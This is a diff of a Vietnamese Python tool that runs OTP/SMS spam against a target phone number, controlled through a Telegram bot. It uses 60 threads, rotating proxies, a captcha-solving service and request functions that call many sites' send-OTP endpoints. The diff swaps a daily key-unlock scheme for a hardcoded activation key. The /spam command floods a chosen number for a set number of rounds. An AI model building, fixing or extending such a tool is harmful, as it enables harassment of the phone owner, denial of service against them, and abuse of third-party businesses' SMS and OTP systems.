@@ -1,5 +1,6 @@
 # tool_spam_otp_gzii_telegram.py
 # Gzii - Smart filter + Delay + KEY + TELEGRAM BOT
+# Key mặc định: GziNee
 # mod made by Bui Vinh text
 
 import os
@@ -27,6 +28,26 @@ warnings.filterwarnings("ignore")
 TELEGRAM_BOT_TOKEN = "DÁN_TOKEN_BOT_TELEGRAM_VÀO_ĐÂY"
 TELEGRAM_ADMIN_ID  = 0   # <-- ID telegram của mày (int), lấy qua @userinfobot
 
+# ============ KEY CỐ ĐỊNH ============
+DEFAULT_KEY = "GziNee"          # <-- key mặc định, không đổi
+KEY_FILE = "key.json"           # lưu trạng thái đã xác thực
+
+def is_key_verified():
+    """Kiểm tra user đã xác thực key chưa (lưu vào file)."""
+    if os.path.exists(KEY_FILE):
+        try:
+            with open(KEY_FILE, "r", encoding="utf-8") as f:
+                data = json.load(f)
+            return data.get("key") == DEFAULT_KEY
+        except Exception:
+            return False
+    return False
+
+def save_verified():
+    """Lưu trạng thái đã xác thực key."""
+    with open(KEY_FILE, "w", encoding="utf-8") as f:
+        json.dump({"key": DEFAULT_KEY, "verified_at": datetime.now().isoformat()}, f)
+
 # ============ CẤU HÌNH TOOL ============
 MAX_THREADS = 60
 PROXY_FILE = "live.txt"
@@ -41,32 +62,6 @@ DELAY_ROUND_MAX = 3
 
 CAPTCHA_PROVIDER = "2captcha"
 CAPTCHA_API_KEY  = ""
-
-# ============ KEY SYSTEM ============
-KEY_FILE = 'key.json'
-
-def save_key(key_value, date_saved):
-    with open(KEY_FILE, 'w') as f:
-        json.dump({'key': key_value, 'date': date_saved}, f)
-
-def load_key():
-    if os.path.exists(KEY_FILE):
-        with open(KEY_FILE, 'r') as f:
-            try:
-                return json.load(f)
-            except json.JSONDecodeError:
-                return None
-    return None
-
-def get_daily_key():
-    """Trả về key hôm nay, KHÔNG hỏi user (bot tự check)."""
-    today = datetime.now().day
-    current_date = datetime.now().strftime('%Y-%m-%d')
-    generated = str(today * 25937 + 469173)
-    saved = load_key()
-    if saved and saved.get('key') == generated and saved.get('date') == current_date:
-        return generated, True
-    return generated, False
 
 # ============ PROXY ============
 def load_proxies():
@@ -156,10 +151,9 @@ UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 
 _tg_lock = threading.Lock()
 
 def tg_send(chat_id, text, parse_mode=None):
-    """Gửi tin nhắn telegram. Tự động chia nếu dài > 4000 ký tự."""
+    """Gửi tin nhắn telegram. Tự chia nếu dài."""
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     try:
-        # Chia tin nhắn dài
         max_len = 4000
         chunks = [text[i:i+max_len] for i in range(0, len(text), max_len)]
         for chunk in chunks:
@@ -171,7 +165,7 @@ def tg_send(chat_id, text, parse_mode=None):
     except Exception as e:
         print(f"[TG-ERROR] {e}")
 
-# ============ LOG + TRACKING ============
+# ============ LOG ============
 _current_success = set()
 _success_lock = threading.Lock()
 _log_buffer = []
@@ -179,18 +173,18 @@ _buffer_lock = threading.Lock()
 _log_timer = None
 
 def _flush_log():
-    global _log_buffer
+    global _log_buffer, _log_timer
     with _buffer_lock:
         if not _log_buffer:
+            _log_timer = None
             return
         msg = "\n".join(_log_buffer)
         _log_buffer = []
-    # gửi về admin
+        _log_timer = None
     if TELEGRAM_ADMIN_ID:
         tg_send(TELEGRAM_ADMIN_ID, msg)
 
 def log_line(s):
-    """Ghi log vào buffer, flush mỗi 2 giây."""
     global _log_timer
     with _buffer_lock:
         _log_buffer.append(s)
@@ -209,7 +203,8 @@ def fail(site, code=""):
     log_line(f"❌ {site} thất bại {code}")
 
 # ============ CÁC HÀM SPAM ============
-# (giữ nguyên toàn bộ — mày paste y nguyên phần từ bản trước)
+# (giữ nguyên toàn bộ — paste y nguyên từ bản trước)
+
 def XWXWWWXWWWXXXXXXWW(sdt):
     try:
         r = req("POST", 'https://www.sapo.vn/fnb/sendotp',
@@ -1040,7 +1035,6 @@ ALL_FUNCTIONS = [
 ]
 
 # ============ BOT LOGIC ============
-# State toàn cục
 bot_state = {
     "running": False,
     "sdt": None,
@@ -1051,9 +1045,14 @@ bot_state = {
     "stop_flag": False,
 }
 
+def _safe_call(fn, sdt):
+    try:
+        fn(sdt)
+    except Exception:
+        pass
+
 def run_spam_loop(sdt, total_rounds, delay_req_min, delay_req_max,
                   delay_round_min, delay_round_max, chat_id):
-    """Vòng lặp spam chạy trong thread riêng. Gửi log + status qua Telegram."""
     global bot_state
 
     bot_state["running"] = True
@@ -1117,12 +1116,6 @@ def run_spam_loop(sdt, total_rounds, delay_req_min, delay_req_max,
                      f"💚 Hàm còn sống: {len(bot_state['active_funcs'])}")
     bot_state["running"] = False
 
-def _safe_call(fn, sdt):
-    try:
-        fn(sdt)
-    except Exception:
-        pass
-
 # ============ TELEGRAM POLLING ============
 def tg_get_updates(offset=None):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
@@ -1136,7 +1129,6 @@ def tg_get_updates(offset=None):
         return []
 
 def handle_command(msg):
-    """Xử lý lệnh từ user."""
     chat_id = msg["chat"]["id"]
     user_id = msg["from"]["id"]
     text = (msg.get("text") or "").strip()
@@ -1146,28 +1138,34 @@ def handle_command(msg):
         tg_send(chat_id, "⛔ Bạn không có quyền dùng bot này.")
         return
 
+    # ====== XÁC THỰC KEY ======
+    if not is_key_verified():
+        # Nếu chưa xác thực và text khác key → yêu cầu nhập key
+        if text != DEFAULT_KEY:
+            tg_send(chat_id,
+                "🔒 BOT CHƯA ĐƯỢC KÍCH HOẠT\n\n"
+                "Gửi key để bắt đầu:\n"
+                f"Key mặc định: `{DEFAULT_KEY}`",
+                parse_mode="Markdown")
+            return
+        else:
+            # Nhập đúng key
+            save_verified()
+            tg_send(chat_id,
+                "✅ KÍCH HOẠT THÀNH CÔNG\n\n"
+                "Gõ /start để xem menu lệnh.")
+            return
+
+    # ====== MENU SAU KHI ĐÃ XÁC THỰC ======
     if text == "/start":
         tg_send(chat_id,
             "🤖 BOT SPAM OTP — Gzii\n\n"
             "📌 Lệnh:\n"
-            "/key — Lấy key hôm nay\n"
             "/spam <sđt> <số_vòng> — Bắt đầu spam\n"
             "/stop — Dừng spam\n"
             "/status — Xem trạng thái\n"
             "/proxy — Xem số proxy\n"
             "/help — Trợ giúp"
-        )
-        return
-
-    if text == "/key":
-        key, valid = get_daily_key()
-        link = f"https://hadeszinh.fwh.is/getkey.php?key={key}"
-        tg_send(chat_id,
-            f"🔑 KEY HÔM NAY\n\n"
-            f"Key: `{key}`\n"
-            f"Trạng thái: {'✅ Đã xác thực' if valid else '❌ Chưa xác thực'}\n"
-            f"Vượt link: {link}",
-            parse_mode="Markdown"
         )
         return
 
@@ -1185,7 +1183,6 @@ def handle_command(msg):
         except ValueError:
             rounds = 100
 
-        # Lấy delay mặc định (delay vừa)
         bot_state["thread"] = threading.Thread(
             target=run_spam_loop,
             args=(sdt, rounds, 0.3, 1.0, 5, 10, chat_id),
@@ -1221,11 +1218,10 @@ def handle_command(msg):
     if text == "/help":
         tg_send(chat_id,
             "📖 HƯỚNG DẪN\n\n"
-            "1️⃣ /key → lấy key hôm nay\n"
-            "2️⃣ Vượt link để xác thực key\n"
-            "3️⃣ /spam <sđt> <số_vòng>\n"
-            "4️⃣ /status để xem tiến độ\n"
-            "5️⃣ /stop để dừng\n\n"
+            "1️⃣ Gửi key mặc định để kích hoạt\n"
+            "2️⃣ /spam <sđt> <số_vòng> để bắt đầu\n"
+            "3️⃣ /status xem tiến độ\n"
+            "4️⃣ /stop để dừng\n\n"
             "⚙️ Delay mặc định: 0.3-1s/request, 5-10s/round"
         )
         return
@@ -1237,11 +1233,10 @@ if __name__ == "__main__":
         print("[!] Chưa điền TELEGRAM_BOT_TOKEN")
         sys.exit(1)
 
-    # Gửi thông báo khởi động cho admin
     if TELEGRAM_ADMIN_ID:
-        tg_send(TELEGRAM_ADMIN_ID, "🤖 Bot đã online!")
+        status = "đã xác thực" if is_key_verified() else "chưa xác thực"
+        tg_send(TELEGRAM_ADMIN_ID, f"🤖 Bot đã online!\nKey: {status}")
 
-    # Polling loop
     last_update_id = None
     print("[✓] Bot đang chạy. Nhấn Ctrl+C để dừng.")
     while True:
